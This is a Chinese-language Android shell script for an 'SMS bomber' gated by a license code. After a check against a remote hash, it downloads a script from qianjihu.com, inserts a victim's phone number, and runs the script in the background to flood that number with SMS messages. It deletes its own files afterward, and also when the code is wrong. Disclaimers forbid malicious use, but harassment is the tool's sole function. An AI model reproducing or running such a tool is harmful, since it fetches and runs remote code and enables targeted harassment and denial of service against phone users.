pass=`curl http://qianjihu.com/jb/32xx`
echo -e "\033[35m 请输入授权码（qq群:659126869获取）： \033[0m"
read PASSWD
key=`echo -n $PASSWD|md5sum`
if [[ ${key%%\ *} == $pass ]]
    then
        echo 
        echo -e "\033[35m 授权成功 \033[0m"
    else
        echo
        echo -e "\033[31m 授权码错误 \033[0m"
		rm $0 && rm *.bak && rm -rf /sdcard/.nbdx && rm /sdcard/.nbdx
exit 0;
fi
echo "====================================================="
echo -e "\033[32m              欢迎使用安卓脚本版短信轰炸 \033[0m"
echo -e "\033[32m 1，开始轰炸(一次性版本) \033[0m"
echo -e "\033[32m 注意：小白版为一次性使用，若要多次使用每次先1后2即可 \033[0m"
echo -e "\033[31m 注意：禁止倒卖和售卖本程序 \033[0m"
echo -e "\033[31m 注意：禁止使用本程序恶意攻击 \033[0m"
echo -e "\033[31m 注意：因本程序导致的法律纠纷与本作者无关 \033[0m"
echo -e "\033[35m                            本程序作者：千狐の王座 \033[0m"
echo -e "\033[32m                          交流讨论QQ群：659126869 \033[0m"

echo "====================================================="
echo -e '\033[32m 是否同意以上\033[31m红色\033[0m的三项(是输y否输n) \033[0m'
read yn
if [[ $yn == y ]]
    then
        echo 
        echo -e "\033[32m 已同意并已知晓 \033[0m"
        mkdir /sdcard/.nbdx && rm *.bak
    else
        echo
        echo -e "\033[31m 未同意不得用本程序！ \033[0m"
        rm $0 && rm *.bak && rm /sdcard/.nbdx && rm -rf /sdcard/.nbdx
exit 0;
fi
echo -e "\033[32m 这里输入1： \033[0m"
read a
if (($a==1));then
curl -o /sdcard/.nbdx/dx http://qianjihu.com/jb/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3 && rm *.bak
echo -e "\033[32m 输入11位目标号码 \033[0m"
read dhhm
sed -i 's/12345678901/'$dhhm'/g' /sdcard/.nbdx/dx
echo -e "\033[35m 设置完毕 \033[0m"
echo -e "\033[35m 请等待......... \033[0m"
sleep 2
echo -e "\033[35m 开始轰炸，，，，， \033[0m"
sleep 2
sh /sdcard/.nbdx/dx &
rm $0 && rm /sdcard/.nbdx
elif (($a==2));then
echo -e "\033[32m 待加入 \033[0m"
else
echo
fi
